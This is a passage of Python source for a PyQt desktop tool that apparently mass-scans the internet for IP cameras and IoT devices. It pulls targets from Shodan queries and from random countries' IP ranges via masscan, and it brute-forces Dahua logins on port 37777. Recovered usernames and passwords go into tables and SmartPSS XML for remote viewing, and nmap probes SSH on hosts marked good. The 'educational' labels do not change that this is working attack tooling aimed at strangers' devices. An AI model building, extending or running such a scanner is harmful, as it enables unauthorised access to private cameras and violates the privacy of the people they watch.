        } for r in self.results if r.get('status') in ('ok', 'auth_ok') and r.get('ip')]

    def _auto_export_smartpss_xml(self):
        """Regenerate Results/smartpss_auto.xml from the current Good Dahua results (no dialog)."""
        try:
            devices = self._collect_good_dahua_devices()
            if not devices:
                return
            out_dir = Path("Results")
            out_dir.mkdir(exist_ok=True)
            out_path = out_dir / "smartpss_auto.xml"
            scanner = DahuaScanner()
            scanner.generate_smartpss_xml(devices, str(out_path))
            self.log(f"Auto-updated SmartPSS XML: {out_path} ({len(devices)} devices)", "success")
        except Exception as e:
            self.log(f"Auto SmartPSS XML export error: {e}", "warning")

    def export_pss_xml_selected(self):
        brand = self.brand_combo.currentText()
        if brand != "Dahua":
            QMessageBox.information(self, "Dahua required", "Switch to Dahua mode to use this action.")
            return

        # collect Dahua-capable devices from successful good results first
        devices = self._collect_good_dahua_devices()
        if devices:
            self.log("Exporting SmartPSS XML from good Dahua results.", "info")
        else:
            self.log("No good Dahua results found; exporting all available Dahua candidates.", "warning")
            devices = []
            for r in self.results:
                ip = r.get('ip')
                if not ip:
                    continue
                if r.get('status') in ('ok', 'auth_ok') or r.get('login') or r.get('password'):
                    devices.append({
                        'ip': ip,
                        'port': int(r.get('port') or 37777),
                        'login': r.get('login', ''),
                        'password': r.get('password', ''),
                    })

        if not devices:
            QMessageBox.information(self, "No Devices", "No Dahua devices available to export.")
            return

        path, _ = QFileDialog.getSaveFileName(self, "Save SmartPSS XML", "smartpss_dahua.xml", "XML Files (*.xml);;All Files (*)")
        if not path:
            return

        scanner = DahuaScanner()
        try:
            out = scanner.generate_smartpss_xml(devices, path)
            self.log(f"SmartPSS XML saved to: {out}", "success")
        except Exception as e:
            self.log(f"Failed to generate SmartPSS XML: {e}", "error")

    def save_current_to_favorites(self):
        url = self.url_bar.text().strip()
        if not url or not url.startswith("http"):
            self.log("No valid URL in the address bar to save.", "warning")
            return
        try:
            ip = url.split("://")[1].split("/")[0].split(":")[0]
        except:
            ip = "unknown"
        if any(fav["url"] == url for fav in self.saved_favorites):
            self.log("This URL is already in favorites.", "warning")
            return
        fav = {"ip": ip, "url": url}
        self.saved_favorites.append(fav)
        if ip != "unknown":
            self.get_country_flag(ip)
        self.update_favorites_table()
        self.save_favorites()
        self.log(f"Saved to favorites: {url}", "success")

    def update_favorites_table(self):
        self.fav_table.setRowCount(0)
        for idx, fav in enumerate(self.saved_favorites):
            ip = fav["ip"]
            flagged_ip = self.get_country_flag(ip)
            self.fav_table.insertRow(idx)
            self.fav_table.setItem(idx, 0, QTableWidgetItem(flagged_ip))
            self.fav_table.setItem(idx, 1, QTableWidgetItem(fav["url"]))
        if self.current_index["fav"] >= len(self.saved_favorites):
            self.current_index["fav"] = len(self.saved_favorites) - 1 if self.saved_favorites else -1
        self.on_tab_changed(self.filter_tabs.currentIndex())

    def load_favorites(self):
        fav_data = self.settings.value("favorites", [])
        if isinstance(fav_data, list):
            self.saved_favorites = fav_data
        else:
            self.saved_favorites = []
        for fav in self.saved_favorites:
            if "ip" in fav:
                self.get_country_flag(fav["ip"])
        self.update_favorites_table()

    def save_favorites(self):
        self.settings.setValue("favorites", self.saved_favorites)

    def load_last_session(self):
        if not self.auto_load_check.isChecked() or not SESSION_FILE.exists():
            return
        # Suspiciously large session files are quarantined without attempting
        # to parse/load them, since json.load()+add_result_row() for a huge
        # result set would block the GUI thread long enough to look like the
        # app is stuck/failed to start.
        try:
            size_mb = SESSION_FILE.stat().st_size / (1024 * 1024)
        except Exception:
            size_mb = 0
        if size_mb > 20:
            self.log(f"last_session.json is {size_mb:.1f} MB (too large to load safely) - quarantining it.", "warning")
            self._quarantine_broken_session_file()
            return
        try:
            with open(SESSION_FILE, "r") as sf:
                good_results = json.load(sf)
            self.results = good_results
            for data in good_results:
                self.add_result_row(data)
            self.log(f"Loaded {len(good_results)} from last session.", "info")
        except Exception as e:
            self.log(f"Failed to load last session: {e}", "warning")
            self._quarantine_broken_session_file()

    def _quarantine_broken_session_file(self):
        """Move an unusable last_session.json into broken/ so it can't keep blocking future launches."""
        try:
            broken_dir = Path("broken")
            broken_dir.mkdir(exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            dest = broken_dir / f"last_session_{timestamp}.json"
            SESSION_FILE.replace(dest)
            self.log(f"Moved unusable last_session.json to {dest} - the app will start clean next time.", "warning")
        except Exception as e:
            self.log(f"Could not quarantine broken last_session.json: {e}", "error")

    def load_history_table(self):
        if not hasattr(self, 'history_table'): return
        self.history_table.setRowCount(0)
        results_base = Path("Results")
        if not results_base.exists(): return
        folders = sorted([f for f in results_base.iterdir() if f.is_dir() and f.name.startswith("edu_results_")],
                         key=lambda x: x.stat().st_mtime, reverse=True)
        for folder in folders:
            try:
                all_file = folder / "all_ips.txt"
                ok_file = folder / "success.txt"
                err_file = folder / "errors.txt"
                total = len(all_file.read_text().splitlines()) if all_file.exists() else 0
                good = len(ok_file.read_text().splitlines()) if ok_file.exists() else 0
                bad = len(err_file.read_text().splitlines()) if err_file.exists() else 0
                row = self.history_table.rowCount()
                self.history_table.insertRow(row)
                self.history_table.setItem(row, 0, QTableWidgetItem(folder.name.replace("edu_results_", "")))
                self.history_table.setItem(row, 1, QTableWidgetItem(str(total)))
                self.history_table.setItem(row, 2, QTableWidgetItem(str(good)))
                self.history_table.setItem(row, 3, QTableWidgetItem(str(bad)))
                self.history_table.item(row, 0).setData(32, str(folder))
            except: continue
        self.log(f"Loaded {len(folders)} previous scan results in History tab.", "info")

    def load_selected_history(self, mi):
        row = mi.row()
        item = self.history_table.item(row, 0)
        if not item: return
        folder_path_str = item.data(32)
        folder = Path(folder_path_str)
        self.log(f"Loading results from {folder.name}...", "info")
        self.table.setRowCount(0)
        self.good_table.setRowCount(0)
        self.bad_table.setRowCount(0)
        self.results.clear()
        self._loading_history = True
        self._batch_loading = True
        try:
            all_file = folder / "all_ips.txt"
            if not all_file.exists():
                self.log("all_ips.txt not found.", "warning")
                return
            lines = [line.strip() for line in all_file.read_text().splitlines() if line.strip()]
            self.table.setRowCount(len(lines))
            good_ips = set()
            bad_ips = set()
            ok_file = folder / "success.txt"
            if ok_file.exists():
                for url_line in ok_file.read_text().splitlines():
                    url_line = url_line.strip()
                    if not url_line: continue
                    try: good_ips.add(url_line.split("://")[1].split("/")[0].split(":")[0])
                    except: continue
            err_file = folder / "errors.txt"
            if err_file.exists():
                for url_line in err_file.read_text().splitlines():
                    url_line = url_line.strip()
                    if not url_line: continue
                    try: bad_ips.add(url_line.split("://")[1].split("/")[0].split(":")[0])
                    except: continue
            for idx, ip in enumerate(lines):
                url = f"http://{ip}"
                data = {"ip": ip, "url": url, "status": "pending", "code": None, "error": None}
                self.results.append(data)
                flagged_ip = self.get_country_flag(ip)
                self.table.setItem(idx, 0, QTableWidgetItem(flagged_ip))
                self.table.setItem(idx, 1, QTableWidgetItem(url))
                if ip in good_ips:
                    self.results[idx]["status"] = "ok"
                    self.results[idx]["code"] = 200
                    self.table.setItem(idx, 2, QTableWidgetItem("ok"))
                    self.table.setItem(idx, 3, QTableWidgetItem("200"))
                elif ip in bad_ips:
                    self.results[idx]["status"] = "failed"
                    self.table.setItem(idx, 2, QTableWidgetItem("failed"))
                else:
                    self.results[idx]["status"] = "failed"
                    self.table.setItem(idx, 2, QTableWidgetItem("failed"))
                if idx % 100 == 0:
                    QApplication.processEvents()
            self._batch_loading = False
            self.update_filtered_tables(force=True)
        except Exception as e:
            self.log(f"Error loading history: {e}", "error")
        finally:
            self._loading_history = False
            self._batch_loading = False
        self.on_tab_changed(self.filter_tabs.currentIndex())
        self.log(f"History session {folder.name} loaded successfully.", "success")

    def _is_good_result(self, data):
        """A result belongs in the Good tab if the worker flagged it ok/auth_ok
        or it returned HTTP 200 - any 200 counts as good, across every mode."""
        if str(data.get("status", "")).lower() in ("ok", "auth_ok"):
            return True
        return str(data.get("code")) == "200"

    def _append_result_to_good_or_bad(self, data):
        """Incrementally add ONE row to Good or Bad instead of calling
        update_filtered_tables(), which wipes and rebuilds the whole table from
        every accumulated result. Calling the full rebuild on every single
        live result made a fast/high-volume scan (e.g. a local UK Hikvision
        scan returning many quick 200s) effectively O(n^2) - the table got
        rebuilt from scratch again for every new hit. update_filtered_tables()
        is still used for the one-off full refreshes (scan finished, history
        load, brand switch) where re-evaluating everything is actually needed.
        """
        brand = self.brand_combo.currentText()
        is_good = self._is_good_result(data) if brand not in ("IP Scanner", "Dahua") else data.get("status", "").lower() in ("ok", "auth_ok")
        target_table = self.good_table if is_good else self.bad_table
        row = target_table.rowCount()
        target_table.insertRow(row)
        if brand in ("IP Scanner", "Dahua"):
            ip_display = self.get_country_flag(data.get("ip", ""))
            target_table.setItem(row, 0, QTableWidgetItem(ip_display))
            target_table.setItem(row, 1, QTableWidgetItem(data.get("hostname", "")))
            if is_good:
                target_table.setItem(row, 2, QTableWidgetItem(data.get("open_ports", "")))
                target_table.setItem(row, 3, QTableWidgetItem(data.get("banners", "")))
                target_table.setItem(row, 4, QTableWidgetItem(data.get("web_detect", "")))
            else:
                target_table.setItem(row, 2, QTableWidgetItem(""))
                target_table.setItem(row, 3, QTableWidgetItem(""))
                target_table.setItem(row, 4, QTableWidgetItem(""))
        else:
            flagged_ip = self.get_country_flag(data.get("ip", ""))
            items = [QTableWidgetItem(flagged_ip), QTableWidgetItem(data.get("url", "")),
                     QTableWidgetItem(data.get("status", "")),
                     QTableWidgetItem(str(data.get("code")) if data.get("code") else "")]
            for i, item in enumerate(items):
                target_table.setItem(row, i, item)
        if is_good:
            self.current_index["good"] = max(-1, min(self.current_index["good"], self.good_table.rowCount() - 1))
            ip = data.get("ip", "")
            if ip:
                self._schedule_port22_scans([ip])
        else:
            self.current_index["bad"] = max(-1, min(self.current_index["bad"], self.bad_table.rowCount() - 1))
        self.on_tab_changed(self.filter_tabs.currentIndex())

    def update_filtered_tables(self, force=False):
        if getattr(self, '_batch_loading', False): return
        brand = self.brand_combo.currentText()
        if brand in ("IP Scanner", "Dahua"):
            self.good_table.setRowCount(0)
            self.bad_table.setRowCount(0)
            good_row = bad_row = 0
            for data in self.results:
                status_lower = data["status"].lower()
                if status_lower == "pending":
                    # not yet brute-tested - keep it out of Good/Bad until it
                    # actually resolves, it still shows in the unfiltered All tab
                    continue
                if status_lower in ("ok", "auth_ok"):
                    ip_display = self.get_country_flag(data.get("ip", ""))
                    self.good_table.insertRow(good_row)
                    self.good_table.setItem(good_row, 0, QTableWidgetItem(ip_display))
                    self.good_table.setItem(good_row, 1, QTableWidgetItem(data.get("hostname", "")))
                    self.good_table.setItem(good_row, 2, QTableWidgetItem(data.get("open_ports", "")))
                    self.good_table.setItem(good_row, 3, QTableWidgetItem(data.get("banners", "")))
                    self.good_table.setItem(good_row, 4, QTableWidgetItem(data.get("web_detect", "")))
                    good_row += 1
                else:
                    ip_display = self.get_country_flag(data.get("ip", ""))
                    self.bad_table.insertRow(bad_row)
                    self.bad_table.setItem(bad_row, 0, QTableWidgetItem(ip_display))
                    self.bad_table.setItem(bad_row, 1, QTableWidgetItem(data.get("hostname", "")))
                    self.bad_table.setItem(bad_row, 2, QTableWidgetItem(""))
                    self.bad_table.setItem(bad_row, 3, QTableWidgetItem(""))
                    self.bad_table.setItem(bad_row, 4, QTableWidgetItem(""))
                    bad_row += 1
            self.current_index["good"] = max(-1, min(self.current_index["good"], self.good_table.rowCount() - 1))
            self.current_index["bad"] = max(-1, min(self.current_index["bad"], self.bad_table.rowCount() - 1))
        else:
            if not force and brand in ("Reecam", "AVTech", "Custom Query"): return
            self.good_table.setRowCount(0)
            self.bad_table.setRowCount(0)
            good_row = bad_row = 0
            for data in self.results:
                flagged_ip = self.get_country_flag(data["ip"])
                items = [QTableWidgetItem(flagged_ip), QTableWidgetItem(data.get("url", "")),
                         QTableWidgetItem(data["status"]), QTableWidgetItem(str(data["code"]) if data["code"] else "")]
                if self._is_good_result(data):
                    self.good_table.insertRow(good_row)
                    for i, item in enumerate(items): self.good_table.setItem(good_row, i, item)
                    good_row += 1
                else:
                    self.bad_table.insertRow(bad_row)
                    for i, item in enumerate(items): self.bad_table.setItem(bad_row, i, item)
                    bad_row += 1
            self.current_index["good"] = max(-1, min(self.current_index["good"], self.good_table.rowCount() - 1))
            self.current_index["bad"] = max(-1, min(self.current_index["bad"], self.bad_table.rowCount() - 1))
        # Every IP that made it into the Good tab gets an nmap check for an open
        # tcp/22; confirmed hosts populate the "Port 22 Open" tab.
        good_ips = [d.get("ip", "") for d in self.results
                    if self._is_good_result(d) and d.get("ip")]
        self._schedule_port22_scans(good_ips)
        self._rebuild_port22_table()
        self.on_tab_changed(self.filter_tabs.currentIndex())

    def _schedule_port22_scans(self, ips):
        """Queue an nmap tcp/22 check for each Good-tab IP not already checked.

        Runs each scan in a daemon thread (matching the app's existing worker
        style); a semaphore caps how many nmap processes run at once. Results
        are marshalled back to the GUI thread via self.dahua_gui_call.
        """
        if getattr(self, "_batch_loading", False):
            return
        for ip in ips:
            host = self.extract_target_host(ip) or ip
            if not host or host in self._port22_checked:
                continue
            self._port22_checked.add(host)
            threading.Thread(target=self._port22_worker, args=(host,), daemon=True).start()

    def _port22_worker(self, host):
        self._port22_sem.acquire()
        try:
            if self._run_nmap_port22(host):
                self.dahua_gui_call.emit(lambda h=host: self._mark_port22_open(h))
        except Exception as e:
            self.dahua_gui_call.emit(lambda m=str(e), h=host: self.log(f"Port 22 nmap check failed for {h}: {m}", "warning"))
        finally:
            self._port22_sem.release()

    def _run_nmap_port22(self, host):
        """Return True if nmap reports tcp/22 open on host.

        Uses the nmap binary (PATH, else the default Windows install path). If
        nmap can't be found at all, falls back to a plain socket connect on 22
        (same open/closed answer) so the feature still works without nmap.
        """
        import subprocess, shutil
        nmap_exe = shutil.which("nmap") or r"C:\Program Files (x86)\Nmap\nmap.exe"
        creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        try:
            proc = subprocess.run(
                [nmap_exe, "-Pn", "-p", "22", "--open", "-T4", host],
                capture_output=True, text=True, timeout=60, creationflags=creationflags)
            for line in (proc.stdout or "").splitlines():
                s = line.strip()
                if s.startswith("22/tcp") and "open" in s:
                    return True
            return False
        except FileNotFoundError:
            return self._socket_check_port22(host)
        except Exception:
            return False

    def _socket_check_port22(self, host):
        try:
            with socket.create_connection((host, 22), timeout=5):
                return True
        except Exception:
            return False

    def _mark_port22_open(self, host):
        """(GUI thread) Record a host with open tcp/22 and refresh the tab."""
        self.port22_open_ips.add(host)
        for data in self.results:
            if (self.extract_target_host(data.get("ip", "")) or data.get("ip", "")) == host:
                data["port22_open"] = True
        self._rebuild_port22_table()
        self.log(f"Port 22 OPEN: {host} -> added to 'Port 22 Open' tab", "success")

    def _rebuild_port22_table(self):
        """Rebuild the "Port 22 Open" table from Good results confirmed open.

        Mirrors the Good table's column layout for the current brand so the row
        looks identical to its Good-tab counterpart.
        """
        if not hasattr(self, "port22_table"):
            return
        brand = self.brand_combo.currentText()
        self.port22_table.setRowCount(0)
        row = 0
        for data in self.results:
            if not self._is_good_result(data):
                continue
            ip = data.get("ip", "")
            host = self.extract_target_host(ip) or ip
            if host not in self.port22_open_ips:
                continue
            self.port22_table.insertRow(row)
            if brand in ("IP Scanner", "Dahua"):
                self.port22_table.setItem(row, 0, QTableWidgetItem(self.get_country_flag(ip)))
                self.port22_table.setItem(row, 1, QTableWidgetItem(data.get("hostname", "")))
                self.port22_table.setItem(row, 2, QTableWidgetItem(data.get("open_ports", "")))
                self.port22_table.setItem(row, 3, QTableWidgetItem(data.get("banners", "")))
                self.port22_table.setItem(row, 4, QTableWidgetItem(data.get("web_detect", "")))
            else:
                self.port22_table.setItem(row, 0, QTableWidgetItem(self.get_country_flag(ip)))
                self.port22_table.setItem(row, 1, QTableWidgetItem(data.get("url", "")))
                self.port22_table.setItem(row, 2, QTableWidgetItem(data.get("status", "")))
                self.port22_table.setItem(row, 3, QTableWidgetItem(str(data.get("code")) if data.get("code") else ""))
            row += 1
        self.current_index["port22"] = max(-1, min(self.current_index.get("port22", -1), self.port22_table.rowCount() - 1))

    def _load_dahua_credentials(self):
        try:
            from modules.dahua_scanner import load_dahua_credentials
            return load_dahua_credentials()
        except Exception as e:
            self.log(f"Failed to load Dahua credentials file: {e}", "warning")
            return DEFAULT_PASSWORDS

    def _find_result_index(self, ip):
        for idx, data in enumerate(self.results):
            if data.get('ip') == ip:
                return idx
        return -1

    def _update_dahua_result_row(self, ip, new_data):
        idx = self._find_result_index(ip)
        if idx < 0:
            return False
        self.results[idx].update(new_data)
        if self.brand_combo.currentText() in ("IP Scanner", "Dahua") and idx < self.table.rowCount():
            data = self.results[idx]
            self.table.setItem(idx, 0, QTableWidgetItem(data.get('ip', '')))
            self.table.setItem(idx, 1, QTableWidgetItem(data.get('hostname', '')))
            self.table.setItem(idx, 2, QTableWidgetItem(data.get('open_ports', '')))
            self.table.setItem(idx, 3, QTableWidgetItem(data.get('banners', '')))
            self.table.setItem(idx, 4, QTableWidgetItem(data.get('web_detect', '')))
        return True

    def _seed_dahua_scan_results(self, targets):
        self._batch_loading = True
        self.table.setRowCount(0)
        self.good_table.setRowCount(0)
        self.bad_table.setRowCount(0)
        self.results.clear()
        for ip, port in self._normalize_targets(targets):
            data = {
                'ip': ip,
                'url': f"http://{ip}",
                'status': 'pending',
                'code': 0,
                'port': port,
                'hostname': ip,
                'open_ports': str(port),
                'banners': 'Masscan pending',
                'web_detect': 'Dahua',
            }
            row = self.table.rowCount()
            self.table.insertRow(row)
            self.table.setItem(row, 0, QTableWidgetItem(data['ip']))
            self.table.setItem(row, 1, QTableWidgetItem(data['hostname']))
            self.table.setItem(row, 2, QTableWidgetItem(data['open_ports']))
            self.table.setItem(row, 3, QTableWidgetItem(data['banners']))
            self.table.setItem(row, 4, QTableWidgetItem(data['web_detect']))
            self.results.append(data)
        self._batch_loading = False
        self.update_filtered_tables(force=True)

    def _build_country_targets_file(self, country, max_ips=2000000, log_cb=None):
        logf = log_cb or self.log
        try:
            geo_dir = Path(__file__).resolve().parent / "modules" / "New Modules"
            geo_path = geo_dir / "geolocation.py"
            if not geo_path.exists():
                logf(f"Country target helper not found: {geo_path}", "warning")
                return None
            # geolocation.py does a plain `import config` expecting its own
            # sibling config.py on sys.path - add that dir temporarily so the
            # dynamic module load below can resolve it.
            geo_dir_str = str(geo_dir)
            added_to_path = geo_dir_str not in sys.path
            if added_to_path:
                sys.path.insert(0, geo_dir_str)
            try:
                spec = importlib.util.spec_from_file_location("geo_helper", str(geo_path))
                geo_mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(geo_mod)
            finally:
                if added_to_path:
                    sys.path.remove(geo_dir_str)
            geo = geo_mod.IPDenyGeolocationToIP(country)
            ranges = geo.get_random_ranges(max_ips=max_ips)
            if not ranges:
                logf(f"No CIDR ranges available for {country}.", "warning")
                return None
            tf = tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt')
            tf.write("\n".join(ranges))
            tf.flush()
            tf.close()
            logf(f"Generated country target list for {country} ({len(ranges)} ranges).", "info")
            return tf.name
        except Exception as e:
            logf(f"Country target generation error: {e}", "error")
            return None

    def _build_random_countries_targets_file(self, max_total_ips=2000000, max_countries=25, log_cb=None):
        """Accumulate IPDeny CIDR ranges across many random countries into one
        target file, matching the real Asleep scanner's --random-country mode
        (asleep.py picks random countries and keeps adding ranges until a large
        total IP budget is reached, instead of scanning just one country)."""
        logf = log_cb or self.log
        try:
            geo_dir = Path(__file__).resolve().parent / "modules" / "New Modules"
            geo_path = geo_dir / "geolocation.py"
            if not geo_path.exists():
                logf(f"Country target helper not found: {geo_path}", "warning")
                return None
            geo_dir_str = str(geo_dir)
            added_to_path = geo_dir_str not in sys.path
            if added_to_path:
                sys.path.insert(0, geo_dir_str)
            try:
                spec = importlib.util.spec_from_file_location("geo_helper", str(geo_path))
                geo_mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(geo_mod)
            finally:
                if added_to_path:
                    sys.path.remove(geo_dir_str)

            countries = list(geo_mod.COUNTRY_TO_ISO.keys())
            random.shuffle(countries)

            all_ranges = []
            total_ips = 0
            countries_used = 0
            for country in countries:
                if total_ips >= max_total_ips or countries_used >= max_countries:
                    break
                remaining = max_total_ips - total_ips
                geo = geo_mod.IPDenyGeolocationToIP(country)
                ranges = geo.get_random_ranges(max_ips=remaining)
                if not ranges:
                    continue
                country_ip_count = sum(geo_mod.IPDenyGeolocationToIP.get_cidr_count(c) for c in ranges)
                all_ranges.extend(ranges)
                total_ips += country_ip_count
                countries_used += 1
                logf(f"Random countries: added {country} ({len(ranges)} ranges, ~{country_ip_count} IPs) - {total_ips}/{max_total_ips} total.", "info")

            if not all_ranges:
                logf("Random countries: no CIDR ranges could be collected.", "warning")
                return None

            tf = tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt')
            tf.write("\n".join(all_ranges))
            tf.flush()
            tf.close()
            logf(f"Random countries: {countries_used} countries, {len(all_ranges)} ranges, ~{total_ips} IPs total.", "success")
            return tf.name
        except Exception as e:
            logf(f"Random countries target generation error: {e}", "error")
            return None

    def _normalize_targets(self, targets):
        normalized = []
        for item in targets or []:
            if isinstance(item, tuple) and len(item) >= 2:
                ip, port = item[0], int(item[1])
            else:
                s = str(item).strip()
                if ":" in s:
                    ip, port = s.split(":", 1)
                    try:
                        port = int(port)
                    except Exception:
                        port = 37777
                else:
                    ip, port = s, 37777
            normalized.append((str(ip).strip(), int(port)))
        return normalized

    def _seed_dahua_brute_tab(self, targets):
        if not hasattr(self, "brute_results_table"):
            return
        self.brute_results_table.setRowCount(0)
        for ip, port in self._normalize_targets(targets):
            row = self.brute_results_table.rowCount()
            self.brute_results_table.insertRow(row)
            self.brute_results_table.setItem(row, 0, QTableWidgetItem(ip))
            self.brute_results_table.setItem(row, 1, QTableWidgetItem("Pending"))
            self.brute_results_table.setItem(row, 2, QTableWidgetItem(""))
            self.brute_results_table.setItem(row, 3, QTableWidgetItem(""))
            self.brute_results_table.setItem(row, 4, QTableWidgetItem(f"Port {port}"))

    def _upsert_brute_result_row(self, data):
        if not hasattr(self, "brute_results_table"):
            return
        ip = data.get("ip", "")
        for row in range(self.brute_results_table.rowCount()):
            item = self.brute_results_table.item(row, 0)
            if item and item.text() == ip:
                self.brute_results_table.setItem(row, 1, QTableWidgetItem(data.get("status", "Pending")))
                self.brute_results_table.setItem(row, 2, QTableWidgetItem(data.get("login", "")))
                self.brute_results_table.setItem(row, 3, QTableWidgetItem(data.get("password", "")))
                self.brute_results_table.setItem(row, 4, QTableWidgetItem(data.get("notes", "")))
                return
        row = self.brute_results_table.rowCount()
        self.brute_results_table.insertRow(row)
        self.brute_results_table.setItem(row, 0, QTableWidgetItem(ip))
        self.brute_results_table.setItem(row, 1, QTableWidgetItem(data.get("status", "Pending")))
        self.brute_results_table.setItem(row, 2, QTableWidgetItem(data.get("login", "")))
        self.brute_results_table.setItem(row, 3, QTableWidgetItem(data.get("password", "")))
        self.brute_results_table.setItem(row, 4, QTableWidgetItem(data.get("notes", "")))

    def add_result_row(self, data):
        brand = self.brand_combo.currentText()
        if brand in ("IP Scanner", "Dahua"):
            row = self.table.rowCount()
            self.table.insertRow(row)
            self.table.setItem(row, 0, QTableWidgetItem(data["ip"]))
            self.table.setItem(row, 1, QTableWidgetItem(data.get("hostname", "")))
            self.table.setItem(row, 2, QTableWidgetItem(data.get("open_ports", "")))
            self.table.setItem(row, 3, QTableWidgetItem(data.get("banners", "")))
            self.table.setItem(row, 4, QTableWidgetItem(data.get("web_detect", "")))
            self.results.append(data)
            if not self._batch_loading and data["status"].lower() != "pending":
                self._append_result_to_good_or_bad(data)
        else:
            ip = data["ip"]
            flagged_ip = self.get_country_flag(ip)
            row = self.table.rowCount()
            self.table.insertRow(row)
            self.table.setItem(row, 0, QTableWidgetItem(flagged_ip))
            self.table.setItem(row, 1, QTableWidgetItem(data["url"]))
            self.table.setItem(row, 2, QTableWidgetItem(data["status"]))
            self.table.setItem(row, 3, QTableWidgetItem(str(data["code"]) if data["code"] else ""))
            self.results.append(data)
            if not self._batch_loading:
                # Every search-engine brand (Hikvision, Reecam, AVTech, Axis,
                # Custom Query, DVR LOGIN, WIFICAM, ...) is filtered live so any
                # HTTP 200 lands in Good and gets the port-22 check. Appending
                # incrementally (instead of a full update_filtered_tables()
                # rebuild) keeps a fast/high-volume scan responsive.
                self._append_result_to_good_or_bad(data)
        if self.auto_cycle_check.isChecked() and data["status"] == "ok":
            if brand == "IP Scanner":
                url = f"http://{data.get('hostname') or data['ip']}"
            else:
                url = data["url"]
            self.url_bar.setText(url)
            self.load_url_with_retry(url)
            self.log(f"Auto-loaded: {url}", "info")

    def _play_sound(self, filepath):
        if not Path(filepath).exists(): return
        try:
            if sys.platform == "win32":
                import winsound
                winsound.PlaySound(filepath, winsound.SND_FILENAME | winsound.SND_ASYNC)
            else:
                try:
                    from playsound import playsound
                    playsound(filepath, block=False)
                except ImportError:
                    self.log("playsound not installed.", "warning")
        except Exception as e:
            self.log(f"Sound playback error: {e}", "warning")

    def play_completion_sound(self):
        if not self.completion_sound_enabled:
            return
        sound_path = self._resolve_completion_sound_path()
        if sound_path.exists():
            self._play_sound(str(sound_path))
        else:
            self.log("Completion sound file not found.", "info")

    def scan_finished(self, total, ok, err):
        self.progress.setValue(100)
        self.status_label.setText("Completed")
        self.play_completion_sound()
        self.log(f"Scan complete: {total} total, {ok} OK, {err} errors", "success")
        self.save_settings()
        self.auto_refresh_timer.stop()
        brand = self.brand_combo.currentText()
        if brand in ("IP Scanner", "Dahua"):
            self.update_filtered_tables()
        else:
            self.update_filtered_tables(force=True)
        self.load_history_table()

    def start_scan(self):
        if self.worker and self.worker.isRunning(): return
        # Multi IoT mode has its own Shodan query + result handling; route to it
        # before any camera-brand branching so the camera paths stay untouched.
        if getattr(self, 'multi_iot_mode', False):
            self._start_multi_iot_scan()
            return
        brand = self.brand_combo.currentText()
        if brand == "Dahua":
            # Dahua uses masscan (port 37777) + credential brute-force instead of
            # the Shodan-query workers below - route straight to the existing pipeline.
            self._wrapper_start_dahua_masscan()
            return
        if brand == "IP Scanner":
            scan_type = self.ip_scan_type_combo.currentText()
            if scan_type == "CIDR":
                cidr = self.cidr_edit.text().strip()
                if not cidr:
                    QMessageBox.warning(self, "Missing CIDR", "Please enter a subnet in CIDR notation.")
                    return
                ip_input = cidr
                input_type = "cidr"
            else:
                start_ip = self.ip_start_edit.text().strip()
                end_ip = self.ip_end_edit.text().strip()
                if not start_ip or not end_ip:
                    QMessageBox.warning(self, "Missing IP", "Please enter both start and end IP addresses.")
                    return
                try:
                    ipaddress.ip_address(start_ip)
                    ipaddress.ip_address(end_ip)
                except ValueError as e:
                    QMessageBox.warning(self, "Invalid IP", str(e))
                    return
                ip_input = (start_ip, end_ip)
                input_type = "range"
            ports_str = self.ports_edit.text().strip()
            if not ports_str:
                ports = [80, 443, 22, 21, 8080, 8443, 3389]
            else:
                try:
                    ports = [int(p.strip()) for p in ports_str.split(",") if p.strip()]
                except:
                    QMessageBox.warning(self, "Invalid Ports", "Ports must be comma-separated integers.")
                    return
            concurrency = self.scan_concurrency_spin.value()
            timeout = self.timeout_spin.value()
            self.table.setRowCount(0)
            self.good_table.setRowCount(0)
            self.bad_table.setRowCount(0)
            self.port22_table.setRowCount(0)
            self.port22_open_ips.clear()
            self._port22_checked.clear()
            self.results.clear()
            self.current_index = {"all": -1, "good": -1, "bad": -1, "port22": -1, "fav": self.current_index.get("fav", -1)}
            self.progress.setValue(0)
            self.status_label.setText("Scanning")
            self.worker = IPScannerWorker(ip_input, ports, timeout, concurrency, input_type)
            self.worker.result_signal.connect(self.add_result_row)
            # log_signal emits (level, message); self.log expects (message, level) -
            # swap here rather than at every emit() call site or in self.log's
            # signature (both are used correctly elsewhere).
            self.worker.log_signal.connect(lambda level, msg: self.log(msg, level))
            self.worker.finished_signal.connect(self.scan_finished)
            self.worker.progress_signal.connect(self.progress.setValue)
            self.worker.status_signal.connect(self.status_label.setText)
            self.worker.start()
        else:
            query = self.build_query()
            if not query: return
            pages = self.pages_spin.value()
            path = self.path_edit.text() if brand in ("Hikvision", "Reecam", "Axis") else ""
            debug = self.debug_check.isChecked()
            timeout = self.timeout_spin.value()
            delay = self.delay_spin.value()
            http_proxy = self.proxy_http.text().strip()
            socks_proxy = self.proxy_socks.text().strip()
            proxies = {}
            if http_proxy: proxies["http"] = http_proxy; proxies["https"] = http_proxy
            if socks_proxy: proxies["http"] = socks_proxy; proxies["https"] = socks_proxy
            self.table.setRowCount(0)
            self.good_table.setRowCount(0)
            self.bad_table.setRowCount(0)
            self.port22_table.setRowCount(0)
            self.port22_open_ips.clear()
            self._port22_checked.clear()
            self.results.clear()
            self.current_index = {"all": -1, "good": -1, "bad": -1, "port22": -1, "fav": self.current_index.get("fav", -1)}
            self.progress.setValue(0)
            self.status_label.setText("Scanning")
            self.log(f"Starting educational scan... Fetching up to {pages} pages", "info")
            self.worker = ScanWorker(query, pages, path, debug, timeout, delay, proxies, brand=brand,
                                      port=self.port_spin.value() if self.port_spin.isVisible() else None)
            self.worker.result_signal.connect(self.add_result_row)
            # log_signal emits (level, message); self.log expects (message, level) -
            # swap here rather than at every emit() call site or in self.log's
            # signature (both are used correctly elsewhere).
            self.worker.log_signal.connect(lambda level, msg: self.log(msg, level))
            self.worker.finished_signal.connect(self.scan_finished)
            self.worker.progress_signal.connect(self.progress.setValue)
            self.worker.status_signal.connect(self.status_label.setText)
            self.worker.start()
        if self.auto_check.isChecked():
            interval = max(60, self.auto_spin.value()) * 1000
            self.auto_refresh_timer.start(interval)

    # ------------------------------------------------------------------
    # Multi IoT scanning (QNAP NAS first) + per-host CVE check / Metasploit
